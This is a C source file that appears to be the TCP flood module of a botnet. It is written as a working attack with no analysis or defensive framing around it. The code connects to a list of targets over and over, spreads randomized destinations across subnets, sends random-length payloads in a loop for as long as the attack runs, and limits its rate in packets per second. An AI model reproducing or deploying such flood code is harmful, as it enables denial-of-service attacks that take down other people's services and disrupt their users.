#define _GNU_SOURCE

#include "../../../../utils/headers/includes.h"
#include "../../../../utils/headers/util.h"
#include "../../../../utils/headers/rand.h"
#include "../../attack.h"


void send_traffic(int fd, struct flood *flood)
{
    char *payload = flood->settings->payload;
    int length = flood->settings->length;
    int free_payload = 0;

    // Randomize payload when data randomization is turned on.
    if (flood->settings->random_data)
    {
        int actual_len = length;
        if (flood->settings->min_length > 0 && flood->settings->max_length > 0)
            actual_len = rand_next_range(flood->settings->min_length, flood->settings->max_length);

        payload = (char *)malloc(actual_len);
        if (payload) {
            rand_str(payload, actual_len);
            length = actual_len;
            free_payload = 1;
        } else {
            payload = flood->settings->payload; // Fallback
        }
    }
    
    if (payload)
        sys_sendto(fd, payload, length, MSG_NOSIGNAL, NULL, 0);
    
    if (free_payload)
        free(payload);
}

void flood_socket(struct flood *flood)
{
    int i = 0;
    int *fd = calloc(flood->num_of_targets, sizeof(int));

    for (i = 0; i < flood->num_of_targets; i++)
    {
        struct flood_target target = flood->targets[i];

        // Randomize destination port
        if (flood->settings->dest_port == 0xffff)
            target.sock_addr.sin_port = rand_next();

        target.sock_addr.sin_port = htons(flood->settings->dest_port);

        // Create socket.
        if ((fd[i] = sys_socket(AF_INET, SOCK_STREAM, 0)) == -1)
            return;

        int error = 0;
        int keepAlive = 1;
        if ((error = sys_setsockopt(fd[i], SOL_SOCKET, SO_KEEPALIVE, &keepAlive, sizeof(keepAlive))) == -1)
            return;

        // Randomize destination address if the netmask is below 32 to add subnet support.
        if (target.netmask < 32)
            target.sock_addr.sin_addr.s_addr = htonl(ntohl(target.addr) + (((uint32_t)rand_next()) >> target.netmask));

        int x;
        for (x = 0; x < flood->settings->repeat; x++)
        {
            sys_connect(fd[i], (struct sockaddr *)&target.sock_addr, sizeof(struct sockaddr_in));
            sys_usleep(flood->settings->csleep * 1000);
        }

        // The payload should be pre-initialized by the bot engine.
        if (flood->settings->payload == NULL)
        {
            // Fallback initialization if something went wrong in parent
            // But we must NOT write to flood->settings->payload here if we expect threads.
            // For now, we assume it's pre-initialized.
        }
    }

    // Start sending traffic.
    while (*flood->running)
    {
        for (i = 0; i < flood->num_of_targets; i++)
        {
            struct flood_target target = flood->targets[i];

         int x;
         for (x = 0; x < flood->settings->repeat; x++)
        {
            sys_connect(fd[i], (struct sockaddr *)&target.sock_addr, sizeof(struct sockaddr_in));
            sys_usleep(flood->settings->sleep * 1000);
        }

            // Randomize destination address if the netmask is below 32 to add subnet support.
            if (target.netmask < 32)
                target.sock_addr.sin_addr.s_addr = htonl(ntohl(target.addr) + (((uint32_t)rand_next()) >> target.netmask));

            // start flood
            if (flood->settings->min_pps > 0 && flood->settings->max_pps > 0)
            {
                int x = 0;
                for (x = 0; x < rand_next_range(flood->settings->min_pps, flood->settings->max_pps); x++) // PPS Limiter
                    send_traffic(fd[i], flood);
                sys_sleep(1);
            }
            else
                send_traffic(fd[i], flood);
            // end flood

            if (flood->settings->sleep > 0)
                sys_usleep(flood->settings->sleep * 1000);
        }
    }
}
